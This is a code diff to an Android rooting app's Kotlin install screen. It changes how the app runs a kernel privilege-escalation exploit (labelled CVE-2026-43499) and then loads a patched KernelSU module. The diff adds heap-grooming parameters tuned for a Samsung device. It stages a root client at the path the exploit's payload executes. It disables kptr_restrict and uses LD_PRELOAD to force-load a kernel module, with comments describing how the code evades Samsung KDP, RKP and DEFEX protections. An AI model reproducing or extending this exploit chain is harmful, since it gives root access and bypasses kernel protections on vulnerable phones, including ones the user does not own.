@@ -195,7 +195,7 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
                 appendLog(app.getString(R.string.log_download_verified))
 
                 setPhase(InstallPhase.Exploiting, app.getString(R.string.status_exploit_running))
-                executeExploit(payloads.exploit)
+                executeExploit(payloads)
 
                 setPhase(InstallPhase.LoadingKernelSu, app.getString(R.string.status_ksu_loading))
                 installKernelSu(payloads)
@@ -213,11 +213,15 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         }
     }
 
-    private suspend fun executeExploit(payload: File) {
+    private suspend fun executeExploit(payloads: VerifiedPayloads) {
+        val payload = payloads.exploit
         val shizuku = shizukuEnabled()
         val logFile = if (shizuku) File(SHIZUKU_LOG_PATH) else File(app.filesDir, "exploit.log")
         if (shizuku) {
             ShizukuController.exec(arrayOf("rm", "-f", SHIZUKU_LOG_PATH)).waitFor()
+            // The payload's UMH root stage execs this exact path
+            // (ROOT_UMH_PATH in target.h) — stage our root client there.
+            shizukuStage(payloads.helper, SHIZUKU_ROOT_CLIENT_PATH, "755")
         } else {
             logFile.delete()
         }
@@ -337,26 +341,36 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
     }
 
     private suspend fun installKernelSu(payloads: VerifiedPayloads) {
+        val clientPath: String
+        val koPath: String
+        val loaderPath: String
         if (shizukuEnabled()) {
-            shizukuStage(payloads.kernelSu, SHIZUKU_KSUD_PATH, "755")
-            shizukuStage(payloads.kernelSu, SHIZUKU_KSUD_STAGE_PATH, "755")
+            shizukuStage(payloads.helper, SHIZUKU_ROOT_CLIENT_PATH, "755")
+            shizukuStage(payloads.ksuLoader, SHIZUKU_KSULOAD_PATH, "755")
+            shizukuStage(payloads.kernelSu, SHIZUKU_KSU_KO_PATH, "755")
+            clientPath = SHIZUKU_ROOT_CLIENT_PATH
+            loaderPath = SHIZUKU_KSULOAD_PATH
+            koPath = SHIZUKU_KSU_KO_PATH
             appendLog(app.getString(R.string.log_ksu_staged))
         } else {
-            val source = shellQuote(payloads.kernelSu.absolutePath)
-            val stageCommand =
-                "/system/bin/cp $source $SHIZUKU_KSUD_PATH && " +
-                    "/system/bin/cp $source $SHIZUKU_KSUD_STAGE_PATH && " +
-                    "/system/bin/chmod 755 $SHIZUKU_KSUD_PATH $SHIZUKU_KSUD_STAGE_PATH"
-            val stage = runHelper("-c", stageCommand)
-            require(stage.code == 0) { app.getString(R.string.error_ksu_stage, stage.output) }
-            appendLog(app.getString(R.string.log_ksu_staged))
+            clientPath = payloads.helper.absolutePath
+            loaderPath = payloads.ksuLoader.absolutePath
+            koPath = payloads.kernelSu.absolutePath
         }
 
-        val lateLoad = runHelper("--late-load")
-        require(lateLoad.code == 0) {
-            app.getString(R.string.error_ksu_verify, lateLoad.code, lateLoad.output)
+        // Late-load the Samsung KDP/RKP/DEFEX-patched KernelSU through the
+        // temp-root channel: ksu-load.so rewrites every UNDEF symbol to
+        // SHN_ABS (clearing TRIM_UNUSED_KSYMS/modversions/vermagic walls)
+        // and calls init_module; the module itself never touches the
+        // syscall table, so RKP stays quiet.
+        val loadCmd = "echo 0 > /proc/sys/kernel/kptr_restrict; " +
+            "KSU_KO_PATH=$koPath KSU_KO_PARAMS=allow_shell=1 " +
+            "LD_PRELOAD=$loaderPath /system/bin/true"
+        val loaded = runClient(arrayOf(clientPath, "-c", loadCmd))
+        require(loaded.output.contains(KSU_LOAD_OK_MARKER)) {
+            app.getString(R.string.error_ksu_verify, loaded.code, loaded.output)
         }
-        if (lateLoad.output.isNotBlank()) appendLog(lateLoad.output)
+        if (loaded.output.isNotBlank()) appendLog(loaded.output)
         storeInstallReceipt()
         appendLog(app.getString(R.string.log_ksu_control_verified))
     }
@@ -444,25 +458,33 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         add("EXPLOIT_ATTEMPT_TIMEOUT_SEC=$EXPLOIT_ATTEMPT_TIMEOUT_SEC")
         add("CVE43499_ROOT_HELPER=$helperPath")
         add("LD_PRELOAD=$payloadPath")
+        // Winning capture knobs (verified on SM-S9010): deep order-3 absorb
+        // plus deeper skb reclaim sends; without them the leak page is
+        // missed and the CFI stage reads a recycled/zeroed fops table.
+        add("RECLAIM_ABSORB_MAX_PAGES=16384")
+        add("PAGE_RECLAIM_SENDS=64")
+        add("RECLAIM_ORDER0_MB=64")
         cachedP0Offset(bootToken)?.let { add("$P0_OFFSET_ENV=$it") }
     }.toTypedArray()
 
     /**
-     * Runs the bootstrap helper for a short management command. Unlike the
-     * exploit run there is no log file to poll, so output is drained inline
-     * and a hard deadline guards against a helper that never exits — without
-     * this, a hung `--late-load` leaves the install stuck in LoadingKernelSu
-     * indefinitely.
+     * Runs the temp-root client for a management command (kernel load and
+     * friends). Unlike the exploit run there is no log file to poll, so
+     * output is drained inline and a hard deadline guards against a client
+     * that never exits.
      */
-    private suspend fun runHelper(vararg arguments: String): CommandResult {
-        val helper = helperFile()
+    private suspend fun runClient(argv: Array<String>): CommandResult {
         val process = if (shizukuEnabled()) {
-            ShizukuController.exec(arrayOf(helper.absolutePath) + arguments)
+            ShizukuController.exec(argv)
         } else {
-            ProcessBuilder(listOf(helper.absolutePath) + arguments)
+            ProcessBuilder(argv.toList())
                 .redirectErrorStream(true)
                 .start()
         }
+        return awaitProcess(process)
+    }
+
+    private suspend fun awaitProcess(process: Process): CommandResult {
         val captured = StringBuilder()
         val startedAt = SystemClock.elapsedRealtime()
         try {
@@ -488,8 +510,6 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
             }
         }
     }
-
-    private fun shellQuote(value: String) = "'${value.replace("'", "'\\''")}'"
 
     private fun setPhase(phase: InstallPhase, message: String) {
         mutableState.value = mutableState.value.copy(phase = phase, message = message)
@@ -544,7 +564,7 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
     private fun File.readTextIfPresent(): String = if (exists()) readText() else ""
 
     companion object {
-        private const val EXPLOIT_ATTEMPTS = "24"
+        private const val EXPLOIT_ATTEMPTS = "8"
         private const val P0_ATTEMPT_TIMEOUT_SEC = "45"
         private const val EXPLOIT_ATTEMPT_TIMEOUT_SEC = "120"
         private const val EXPLOIT_STALL_MILLIS = 90_000L
@@ -562,8 +582,12 @@ class InstallViewModel(application: Application) : AndroidViewModel(application)
         private const val SHIZUKU_LOG_PATH = "/data/local/tmp/ksu-exploit.log"
         private const val SHIZUKU_HELPER_PATH = "/data/local/tmp/ksu-helper"
         private const val SHIZUKU_PAYLOAD_PATH = "/data/local/tmp/ksu-payload"
-        private const val SHIZUKU_KSUD_PATH = "/data/local/tmp/ksud-s25u-kdp"
-        private const val SHIZUKU_KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
+        // Must match ROOT_UMH_PATH in the payload's target.h: the payload's
+        // workqueue root stage execs this exact path with --umh.
+        private const val SHIZUKU_ROOT_CLIENT_PATH = "/data/local/tmp/cve-2026-43499-root"
+        private const val SHIZUKU_KSULOAD_PATH = "/data/local/tmp/ksu-load.so"
+        private const val SHIZUKU_KSU_KO_PATH = "/data/local/tmp/ksu-c12.ko"
+        private const val KSU_LOAD_OK_MARKER = "KernelSU loaded OK"
         private val LOG_POLL_INTERVAL = 250.milliseconds
         private val HELPER_POLL_INTERVAL = 250.milliseconds
         private val SHIZUKU_LOG_POLL_INTERVAL = 1.seconds
